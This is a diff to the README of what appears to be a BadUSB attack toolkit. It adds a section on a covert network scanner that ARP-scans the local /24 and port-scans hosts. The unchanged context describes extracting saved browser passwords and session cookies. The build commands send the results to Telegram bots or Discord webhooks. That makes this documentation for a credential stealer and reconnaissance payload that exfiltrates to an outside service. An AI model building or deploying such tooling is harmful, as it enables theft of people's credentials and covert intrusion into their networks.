@@ -39,6 +39,21 @@ Extracts saved credentials from **7 browsers** + session cookies:
 
 **Note:** Chrome v127+ (v20 encryption) passwords can't currently be decrypted. URLs and usernames are still captured.
 
+### Network Scanner (`badusb/netscan/`)
+
+Maps the local network — discovers hosts and open ports. Uses native Windows APIs (Winsock2 + iphlpapi). No nmap, no PowerShell.
+
+**Quick mode (~25s):**
+- Local adapter info (IP, MAC, gateway, DNS)
+- ARP scan entire /24 — finds all live hosts + MAC addresses
+- Port scan localhost only (SSH, HTTP, SMB, RDP, etc.)
+
+**Deep mode (~2-3min):**
+- Everything from quick mode
+- Port scans every discovered host (7 common ports)
+
+Threaded ARP scan (50 parallel threads) for speed.
+
 ---
 
 ## Setup
@@ -63,6 +78,9 @@ python tools/build.py wifi --telegram --token YOUR_TOKEN --chat YOUR_CHAT
 
 # Build only browser tool with Discord
 python tools/build.py browser --discord --webhook https://discord.com/api/webhooks/ID/TOKEN
+
+# Build only network scanner
+python tools/build.py scan --telegram --token YOUR_TOKEN --chat YOUR_CHAT
 ```
 
 Or compile manually with Visual Studio:
